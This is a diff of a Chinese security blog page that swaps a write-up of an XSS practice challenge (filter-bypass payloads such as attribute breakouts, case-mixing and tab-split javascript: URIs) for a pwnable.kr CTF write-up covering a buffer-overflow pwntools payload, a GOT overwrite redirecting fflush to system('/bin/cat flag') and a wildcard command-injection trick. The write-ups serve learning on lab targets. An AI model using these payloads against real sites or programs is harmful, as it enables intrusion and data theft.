@@ -24,25 +24,21 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"finsenty54.github.io","root":"/","images":"/images","scheme":"Mist","version":"8.1.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"manual","top_n_per_article":2,"unescape":false,"preload":false}};
   </script>
-<meta name="description" content="less1反射型XSS也被称为非持久性CSS当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。 alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。 查看源码window.alert &#x3D; function()  echo &quot;&lt;h2 align&#x3D;ce">
+<meta name="description" content="pwnable.kr (1)命令函数调用栈的查看backtrace：查看函数调用的顺序（函数调用栈的信息）frame N：切换到栈编号为N的上下文中info frame：查看当前函数调用的栈帧信息 “disassemble &#x2F;r”命令可以用16进制形式显示程序的原始机器码disass &#x2F;r ‘fflush@plt’ echo $PATH">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XSS 20关挑战">
-<meta property="og:url" content="http://finsenty54.github.io/2019/03/01/xss/index.html">
+<meta property="og:title" content="pwnable.kr (1)">
+<meta property="og:url" content="http://finsenty54.github.io/2021/03/06/pwnable.kr_1/index.html">
 <meta property="og:site_name" content="FINSENTY54">
-<meta property="og:description" content="less1反射型XSS也被称为非持久性CSS当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。 alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。 查看源码window.alert &#x3D; function()  echo &quot;&lt;h2 align&#x3D;ce">
+<meta property="og:description" content="pwnable.kr (1)命令函数调用栈的查看backtrace：查看函数调用的顺序（函数调用栈的信息）frame N：切换到栈编号为N的上下文中info frame：查看当前函数调用的栈帧信息 “disassemble &#x2F;r”命令可以用16进制形式显示程序的原始机器码disass &#x2F;r ‘fflush@plt’ echo $PATH">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.ax1x.com/2019/03/03/kqT7Ed.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/03/27/AdFKeI.th.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/03/27/AdkZNV.th.png">
-<meta property="article:published_time" content="2019-03-01T14:22:42.000Z">
-<meta property="article:modified_time" content="2020-10-31T08:53:12.096Z">
+<meta property="article:published_time" content="2021-03-06T01:57:39.000Z">
+<meta property="article:modified_time" content="2021-03-06T01:58:48.034Z">
 <meta property="article:author" content="finsenty54">
-<meta property="article:tag" content="xss">
+<meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s2.ax1x.com/2019/03/03/kqT7Ed.png">
 
 
-<link rel="canonical" href="http://finsenty54.github.io/2019/03/01/xss/">
+<link rel="canonical" href="http://finsenty54.github.io/2021/03/06/pwnable.kr_1/">
 
 
 <script class="page-configurations">
@@ -54,7 +50,7 @@
     lang   : 'zh-CN'
   };
 </script>
-<title>XSS 20关挑战 | FINSENTY54</title>
+<title>pwnable.kr (1) | FINSENTY54</title>
   
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-135283153-1"></script>
     <script>
@@ -227,7 +223,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#less1"><span class="nav-number">1.</span> <span class="nav-text">less1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less2"><span class="nav-number">2.</span> <span class="nav-text">less2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less3"><span class="nav-number">3.</span> <span class="nav-text">less3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less4"><span class="nav-number">4.</span> <span class="nav-text">less4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less5"><span class="nav-number">5.</span> <span class="nav-text">less5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less6"><span class="nav-number">6.</span> <span class="nav-text">less6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less7"><span class="nav-number">7.</span> <span class="nav-text">less7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less8"><span class="nav-number">8.</span> <span class="nav-text">less8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less9"><span class="nav-number">9.</span> <span class="nav-text">less9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#less10"><span class="nav-number">10.</span> <span class="nav-text">less10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9B%B4%E6%96%B0%E4%BA%8E2019-03-27-18-15-42-%E6%98%9F%E6%9C%9F%E4%B8%89"><span class="nav-number">11.</span> <span class="nav-text">更新于2019-03-27 18:15:42 星期三</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwnable-kr-1"><span class="nav-number">1.</span> <span class="nav-text">pwnable.kr (1)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4"><span class="nav-number">1.1.</span> <span class="nav-text">命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwntools"><span class="nav-number">1.2.</span> <span class="nav-text">pwntools</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%A6%E5%8F%82%E8%BF%90%E8%A1%8C"><span class="nav-number">1.2.1.</span> <span class="nav-text">带参运行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fd"><span class="nav-number">1.3.</span> <span class="nav-text">fd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag"><span class="nav-number">1.4.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#passcode"><span class="nav-number">1.5.</span> <span class="nav-text">passcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%AB%AF%E5%BA%8F%E7%A0%94%E7%A9%B6"><span class="nav-number">1.5.1.</span> <span class="nav-text">小端序研究</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rondom"><span class="nav-number">1.6.</span> <span class="nav-text">rondom</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#leg"><span class="nav-number">1.7.</span> <span class="nav-text">leg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#arm"><span class="nav-number">1.8.</span> <span class="nav-text">arm</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mistake"><span class="nav-number">1.9.</span> <span class="nav-text">mistake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellshock"><span class="nav-number">1.10.</span> <span class="nav-text">shellshock</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%84user-id"><span class="nav-number">1.10.1.</span> <span class="nav-text">各user id</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#setuid%E5%B1%9E%E6%80%A7%EF%BC%8C%E6%9D%83%E9%99%90%EF%BC%8C%E5%8D%B3%E6%96%87%E4%BB%B6%E6%9C%89-s"><span class="nav-number">1.10.2.</span> <span class="nav-text">setuid属性，权限，即文件有+s</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90"><span class="nav-number">1.10.3.</span> <span class="nav-text">例子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E9%A2%98%E6%9D%83%E9%99%90"><span class="nav-number">1.10.4.</span> <span class="nav-text">本题权限</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#coin1"><span class="nav-number">1.11.</span> <span class="nav-text">coin1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cmd1"><span class="nav-number">1.12.</span> <span class="nav-text">cmd1</span></a></li></ol></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -309,7 +305,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://finsenty54.github.io/2019/03/01/xss/">
+    <link itemprop="mainEntityOfPage" href="http://finsenty54.github.io/2021/03/06/pwnable.kr_1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://media.giphy.com/media/5xtDarHBDofiI04yE4U/giphy.gif">
@@ -322,7 +318,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          XSS 20关挑战
+          pwnable.kr (1)
         </h1>
 
         <div class="post-meta-container">
@@ -332,19 +328,22 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2019-03-01 22:22:42" itemprop="dateCreated datePublished" datetime="2019-03-01T22:22:42+08:00">2019-03-01</time>
+      <time title="创建时间：2021-03-06 09:57:39 / 修改时间：09:58:48" itemprop="dateCreated datePublished" datetime="2021-03-06T09:57:39+08:00">2021-03-06</time>
     </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-10-31 16:53:12" itemprop="dateModified" datetime="2020-10-31T16:53:12+08:00">2020-10-31</time>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
       </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwnable-kr/" itemprop="url" rel="index"><span itemprop="name">pwnable.kr</span></a>
+        </span>
+    </span>
 
   
-    <span id="/2019/03/01/xss/" class="post-meta-item leancloud_visitors" data-flag-title="XSS 20关挑战" title="阅读次数">
+    <span id="/2021/03/06/pwnable.kr_1/" class="post-meta-item leancloud_visitors" data-flag-title="pwnable.kr (1)" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -359,8 +358,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2019/03/01/xss/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2019/03/01/xss/" itemprop="commentCount"></span>
+    <a title="valine" href="/2021/03/06/pwnable.kr_1/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/03/06/pwnable.kr_1/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -372,14 +371,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>2.2k</span>
+      <span>5.5k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
+      <span>5 分钟</span>
     </span>
 </div>
 
@@ -390,35 +389,109 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p>反射型XSS也被称为非持久性CSS<br>当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。</p>
-<p>alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。</p>
-<p>查看源码<code>window.alert = function()  </code><br><code>echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</code>没有过滤<br>直接调用函数就可以通关<code>&lt;script&gt;window.alert()&lt;/script&gt;</code></p>
-<p><em><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如 JavaScript。</em></p>
+        <h1 id="pwnable-kr-1"><a href="#pwnable-kr-1" class="headerlink" title="pwnable.kr (1)"></a>pwnable.kr (1)</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>函数调用栈的查看<br>backtrace：查看函数调用的顺序（函数调用栈的信息）<br>frame N：切换到栈编号为N的上下文中<br>info frame：查看当前函数调用的栈帧信息</p>
+<p>“disassemble /r”命令可以用16进制形式显示程序的原始机器码<br>disass /r ‘fflush@plt’</p>
+<p>echo $PATH</p>
 <a id="more"></a>
+<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>32位， <code>p32()</code> 可以让我们转换整数到<code>小端序</code>格式</p>
+<pre><code>c.sendline(b&quot;AAAA&quot;*13+p32(0xcafebabe))</code></pre>
+<p>加个<code>b</code>，不然是str格式，即<code>utf-8</code>，编码不一样<br>bytes字节符，打印以b开头</p>
+<pre><code>┌─[zentreisender@parrotos]─[~/Documents/pwnable.kr/BOF]
+└──╼ $python3 exploit.py 
+[+] Opening connection to pwnable.kr on port 9000: Done
+[*] Switching to interactive mode
+$ id
+uid=1008(bof) gid=1008(bof) groups=1008(bof)</code></pre>
+<p>id 命令</p>
+<h3 id="带参运行"><a href="#带参运行" class="headerlink" title="带参运行"></a>带参运行</h3><p>shell=ssh(‘col’,’pwnable.kr’, port=2222 ,password=’guest’)<br>p=shell.process(argv=[‘./col’,data_final]) #带参运行<br>ssh 链接也可以用process()</p>
+<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。<br>每个<code>Unix进程（</code>除了可能的守护进程）应均有<code>三个标准的POSIX文件描述符</code>，对应于三个标准流</p>
+<p>strcmp()<br>0    the contents of both strings are equal</p>
+<pre><code>0    Standard input    STDIN_FILENO    stdin
+1    Standard output    STDOUT_FILENO    stdout
+2    Standard error    STDERR_FILENO    stderr</code></pre>
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>做的少了，拿着文件单步运行了半天，又是strace , ltrace ,想看出些名堂，后来偶然看到upx字符串，就想不是win才有upx压缩，最后放弃；一搜wp才发现linux底下，<code>upx -d </code>就行。</p>
+<p>断点到leave, 然后<br>peda:<br><code>x/s malloc</code>地址就得到flag</p>
+<h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><p>got 表项覆盖</p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/@andrew-bae/pwnable-kr-passcode-writeup-2fdfd9fec283">https://medium.com/@andrew-bae/pwnable-kr-passcode-writeup-2fdfd9fec283</a><br>栈溢出，<code>scanf(%100, name)</code></p>
+<pre><code>   0x804862f &lt;welcome+38&gt;:    lea    edx,[ebp-0x70]</code></pre>
+<p>0x70=112 至少116个字符溢出到返回地址，name总共一百，所以溢出name不行</p>
 <hr>
-<h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>利用页面元素看到输入在<code>&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;</code><br>闭合input语句即可<br><code>1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</code><br><code>1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code></p>
-<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/kqT7Ed"><img src="https://s2.ax1x.com/2019/03/03/kqT7Ed.png" alt="kqT7Ed.png"></a></p>
+<p>  [24] .data             PROGBITS        0804a024 001024 000008 00  WA  0   0  4<br>我们直接在相应位置ebp-0x10, ebp-0xc放入想要的数字，但是scanf遇空格结束输入 </p>
+<p>gdb-peda$ print $ebp-0x70<br>$1 = (void *) 0xffe43ab8</p>
+<pre><code>0x804857c &lt;login+24&gt;:    mov    edx,DWORD PTR [ebp-0x10]
+
+0x80485aa &lt;login+70&gt;:    mov    edx,DWORD PTR [ebp-0xc]
+
+0x80485c5 &lt;login+97&gt;:    cmp    DWORD PTR [ebp-0x10],0x528e6
+0x80485ce &lt;login+106&gt;:    cmp    DWORD PTR [ebp-0xc],0xcc07c9</code></pre>
+<p>0x70-xc =100 刚好溢出不到</p>
 <hr>
-<h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><p>查看页面元素<code>&lt;input name=keyword  value=&#39;1&#39;&gt;</code>在input语句里<br>尝试闭合无用<br>查看源码<code>str</code>都加上了<code>htmlspecialchars</code>函数，但默认配置是不过滤单引号的<br><code>&#39;onmouseover=&#39;window.alert()</code>即可</p>
-<p>输入<code>&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;=&quot;&quot;&gt;</code><br>输入<code>&#39;&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;&#39;=&quot;&quot;&gt;</code><br>输入<code>&#39;onclick&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick&#39;&#39;=&quot;&quot;&gt;</code><br>输入<code>onclick=</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick=&quot;&quot;&gt;</code></p>
+<p>scanf()函数接收输入数据时，遇以下情况结束一个数据的输入：<br>① 遇空格、“回车”、“跳格”键。<br>② 遇宽度结束。<br>③ 遇非法输入。</p>
 <hr>
-<h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p>输入<code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code><br>查看可知<code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; scriptalert()=&quot;&quot; script&quot;&quot;=&quot;&quot;&gt;</code>过滤了<code>&lt;</code> <code>&gt;</code><br>利用上节方法<br><code>&quot;onclick=&quot;alert()</code></p>
-<p>更新于2019-03-03 11:19:50 星期日</p>
+<p>Partial RELRO(The GOT table can be overwritten)</p>
+<p>So, if I <code>overwrite fflush@got.plt address</code> as <code>system(“/bin/cat flag”)</code>; address, this binary will execute system(“/bin/cat flag”); after scanf .</p>
+<h3 id="小端序研究"><a href="#小端序研究" class="headerlink" title="小端序研究"></a>小端序研究</h3><pre><code>objdump -R ./passcode
+0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
+
+plt 表项
+8048430:    ff 25 04 a0 04 08        jmp    *0x804a004
+命令中地址倒序，即小端序
+got 表中地址也是倒序，即小端序
+0x804a00c &lt;puts@got.plt&gt;:    0xf7597ca0
+0x804a00c &lt;puts@got.plt&gt;:    0xa0    0x7c    0x59 0xf7
+
+栈中地址也是小端序
+0000| 0xffb30e38 --&gt; 0xffb30e58
+gdb-peda$ x/4bx $esp
+0xffb30e38:    0x58    0x0e    0xb3    0xff
+
+只是存储方式是小端序，读出来还是原本的顺序
+payload += p32(0x0804a004)所以我们小端序写入栈中，执行地址没有小端序，why?
+
+输入12345678 = 0xBC 614E
+gdb-peda$ x/4bx $ebp-0xc
+0xffffcf4c:    0x4e    0x61    0xbc    0x00
+栈中是小端序
+输入的是单字节还是顺序存储，多字节如int，都是小端序</code></pre>
 <hr>
-<h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>试过后发现<code>onclick</code>变为<code>o_nclick</code><br><code>script</code>变为<code>sc_ript</code><br>使用<code>&quot;&gt;&lt;a href=&quot;javascript:alert()&quot;&gt;</code></p>
-<hr>
-<h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><p><code>onclick script href</code>输入后都进行了变化<br><code>&quot;&gt;&lt;a HRef=&quot;javascript:alert()&quot;&gt;</code><br><code>keyword=&quot;ONclick=&quot;alert()</code><br><code>keyword=&quot;&gt;&lt;scriPt&gt;alert()&lt;/SCRIpt&gt;&lt;&quot;</code><br><code>keyword=&quot;&gt;&lt;a HreF=javascript:alert()&gt;213&lt;/a&gt;&quot;&lt;</code><br>进行大小写替换可以</p>
-<hr>
-<h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p><code>script</code>被过滤，改变大小写也没有用<br><code>on</code>被过滤<br><code>href</code>同样如此<br><code>keyword=&quot;&gt;&lt;scriscriptpt&gt;alert()&lt;/scrscriptipt&gt;&lt;&quot;</code><br>利用双写绕过</p>
-<p>更新于2019-03-06 21:20:39 星期三</p>
-<hr>
-<h2 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h2><p>这题可以添加链接<br>直接使用<code>javascript:alert(1)</code><br>但并没有用，查看源码<code>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</code>被替换了<br>使用制表符绕过<code>%09</code><br><code>keyword=javasc%09ript%3Aalert%281%29&amp;submit=添加友情链接</code></p>
-<hr>
-<h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>上题结果没有用，查看源码<code>if(false===strpos($str7,&#39;http://&#39;))</code><br>知一定要有<code>http://</code><br>在javascript伪协议里面，属于js范畴，所以单行注释符是可以使用的<br><code>javasc%09ript%3Aalert%281%29//http://www.test.com</code></p>
-<hr>
-<h2 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h2><p>查看页面元素<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/AdFKeI"><img src="https://s2.ax1x.com/2019/03/27/AdFKeI.th.png" alt="AdFKeI.th.png"></a><br>有几个隐藏的值，注入点就在这<br><code>keyword=test&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()</code><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/AdkZNV"><img src="https://s2.ax1x.com/2019/03/27/AdkZNV.th.png" alt="AdkZNV.th.png"></a></p>
-<hr>
-<h2 id="更新于2019-03-27-18-15-42-星期三"><a href="#更新于2019-03-27-18-15-42-星期三" class="headerlink" title="更新于2019-03-27 18:15:42 星期三"></a>更新于2019-03-27 18:15:42 星期三</h2>
+<p>将fflush的got中的地址改为system的地址，这个地址不是libc库中的地址，而是代码段中的地址，即可以是任意可执行地址， 例如0x080485ea，但还要传参数，所以要提前一些：</p>
+<pre><code>   0x080485e3 &lt;+127&gt;:    mov    DWORD PTR [esp],0x80487af
+   0x080485ea &lt;+134&gt;:    call   0x8048460 &lt;system@plt&gt;
+   0x080485ef &lt;+139&gt;:    leave  
+   0x080485f0 &lt;+140&gt;:    ret    </code></pre>
+<p>0x80487af 字符串参数<br> 0x080485ea &lt;+134&gt;:    call   0x8048460 &lt;system@plt&gt;</p>
+<p>代码：<br><a target="_blank" rel="noopener" href="https://github.com/Finsenty54/attack-code/blob/master/pwnable.kr/passcode.py">https://github.com/Finsenty54/attack-code/blob/master/pwnable.kr/passcode.py</a></p>
+<h2 id="rondom"><a href="#rondom" class="headerlink" title="rondom"></a>rondom</h2><p>简单，rand() 不是true rondom</p>
+<h2 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h2><h2 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/9056630.html">https://www.cnblogs.com/ichunqiu/p/9056630.html</a><br>在执行add r0, r1, #5指令时，第二条指令正在译码阶段，而第三条指令正在取指阶段。在执行第一条指令时，PC寄存器应指向第三条指令。也即，当处理器为三级流水线结构时，PC寄存器总是指向随后的第三条指令。</p>
+<p>当处理器处于ARM状态时，每条ARM指令为4个字节，所以PC寄存器的值为当前指令地址 + 8字节<br>当处理器处于Thumb状态时，每条Thumb指令为2字节，所以PC寄存器的值为当前指令地址 + 4字节 </p>
+<pre><code>/*  key1
+    0x00008cdc &lt;+8&gt;:    mov    r3, pc
+       0x00008ce0 &lt;+12&gt;:    mov    r0, r3
+           pc=0x8ce4
+    r4=pc
+    key2
+    取pc值的时候应该还在arm状态
+        pc=0x00008d0c
+    key3
+    lr 返回地址=0x00008d80
+将三个pc值加在一起 等于输入进的 k
+*/</code></pre>
+<p>服务器好像down了<br>直接给falg:<code>My daddy has a lot of ARMv5te muscle!</code></p>
+<h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><p>fd=open(“/home/mistake/password”,O_RDONLY,0400) &lt; 0</p>
+<p>比较运算符高于赋值运算符</p>
+<h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p><a target="_blank" rel="noopener" href="https://linux.die.net/man/7/credentials">https://linux.die.net/man/7/credentials</a><br><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/User_identifier">https://en.wikipedia.org/wiki/User_identifier</a></p>
+<h3 id="各user-id"><a href="#各user-id" class="headerlink" title="各user id"></a>各user id</h3><p>Effective user ID and effective group ID. These IDs are used by the kernel to determine the permissions that the process will have when accessing shared resources such as message queues, shared memory, and semaphores.On most UNIX systems, these IDs also determine the permissions when accessing files.<br> obtain its effective user (group) ID using geteuid(2) (getegid(2)).</p>
+<p>Saved set-user-ID and saved set-group-ID. These IDs are used in set-user-ID and set-group-ID programs to <code>save a copy of the corresponding effective IDs </code>that were set when the program was executed (see execve(2)).<br>A set-user-ID program can assume and drop privileges by switching its effective user ID back and forth between the values in its real user ID and saved set-user-ID. This switching is done via calls to seteuid(2), setreuid(2), or setresuid(2).<br>比如ruid是普通用户，此时降权；suid是root，设置euid为suid后，提权<br> A process can obtain its saved set-user-ID (set-group-ID) using getresuid(2) (getresgid(2)).</p>
+<p>Real user ID and real group ID. These IDs determine who owns the process. A process can obtain its real user (group) ID using getuid(2) (getgid(2)).</p>
+<h3 id="setuid属性，权限，即文件有-s"><a href="#setuid属性，权限，即文件有-s" class="headerlink" title="setuid属性，权限，即文件有+s"></a>setuid属性，权限，即文件有+s</h3><p>-r-xr-sr-x  1 root shellshock_pwn   8547 Oct 12  2014 shellshock<br>When the setuid or setgid attributes are set on an executable file, then any users able to execute the file will automatically execute the file with the privileges of the file’s owner (commonly root) and/or the file’s group, depending upon the flags set</p>
+<p>chmod by setting the high-order octal digit to 4 for setuid or 2 for setgid. “chmod 6711 file” will set both the setuid and setgid bits (4+2=6), making the file read/write/executable for the owner (7), and executable by the group (first 1) and others (second 1). When a user other than the owner executes the file, the process will run with user and group permissions set upon it by its owner. For example, if the file is owned by user root and group wheel, it will run as root:wheel no matter who executes the file.</p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>4701 on an executable file owned by ‘root’ and the group ‘root’</p>
+<p>A user named ‘thompson’ attempts to execute the file. The executable permission for all users is set (the ‘1’) so ‘thompson’ can execute the file. The file owner is ‘root’ and the SUID permission is set (the ‘4’) - so the file is executed as ‘root’.</p>
+<h3 id="本题权限"><a href="#本题权限" class="headerlink" title="本题权限"></a>本题权限</h3><p>shellshock@pwnable:~$ stat -c “%a %A” shellshock<br>2555 -r-xr-sr-x<br> setgid bits</p>
+<p>破壳（ShellShock）漏洞<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/45390.html">https://www.freebuf.com/articles/system/45390.html</a></p>
+<h2 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h2><p>服务器上没有按pwntools，运行不起来，改成re+socket中不行，懒得弄了</p>
+<h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><p>echo $PATH<br>PATH表明程序所在的目录，运行一个程序，不在当前文件夹中，会遍历PATH中的目录，寻找程序所在文件夹<br>cat 命令在<code>/bin</code> 下<br>该题，用到了linux通配符<br><code>./cmd1 &quot;/bin/cat fla*&quot;</code></p>
+
     </div>
 
     
@@ -435,7 +508,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://finsenty54.github.io/2019/03/01/xss/" title="XSS 20关挑战">http://finsenty54.github.io/2019/03/01/xss/</a>
+      <a href="http://finsenty54.github.io/2021/03/06/pwnable.kr_1/" title="pwnable.kr (1)">http://finsenty54.github.io/2021/03/06/pwnable.kr_1/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -461,21 +534,18 @@
 </div>
 
           <div class="post-tags">
-              <a href="/tags/xss/" rel="tag"># xss</a>
+              <a href="/tags/PWN/" rel="tag"># PWN</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2019/02/26/sqli-labs/" rel="prev" title="sqli-labs(less-1__less-22)">
-                  <i class="fa fa-chevron-left"></i> sqli-labs(less-1__less-22)
+                <a href="/2021/03/04/heap%E5%85%A5%E9%97%A8/" rel="prev" title="heap入门">
+                  <i class="fa fa-chevron-left"></i> heap入门
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2019/03/15/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="next" title="Docker学习笔记">
-                  Docker学习笔记 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
@@ -591,7 +661,7 @@ NexT.utils.loadComments('#valine-comments', () => {
   NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
